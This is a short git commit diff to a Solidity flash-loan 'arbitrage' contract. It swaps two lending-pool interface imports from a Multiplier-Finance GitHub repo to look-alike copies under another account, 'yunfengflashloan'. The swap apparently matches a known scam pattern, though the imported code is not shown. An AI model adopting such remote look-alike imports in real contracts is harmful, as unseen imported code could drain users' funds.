85be648f79b0b75ed2f2bf1b7f83dd3b2965d2c1
MC-Financial <117498897+MC-Financial@users.noreply.github.com>
2022-12-10 08:41:05 -0500

    Update EthERC20ArbitrageContract.sol

--- EthERC20ArbitrageContract.sol
+++ EthERC20ArbitrageContract.sol
@@ -20,8 +20,9 @@ import "https://github.com/MC-Financial/router/blob/main/IAaveEthRouter.sol";
 import "https://github.com/Uniswap/v3-core/blob/main/contracts/interfaces/IUniswapV3Factory.sol";
 
 // Multiplier-Finance Smart Contracts
-import "https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPoolAddressesProvider.sol";
-import "https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPool.sol";
+import "https://github.com/yunfengflashloan/Multiplier-Finance/blob/main/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPoolAddressesProvider.sol";
+import "https://github.com/yunfengflashloan/Multiplier-Finance/blob/main/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPool.sol";
+
 
 
 
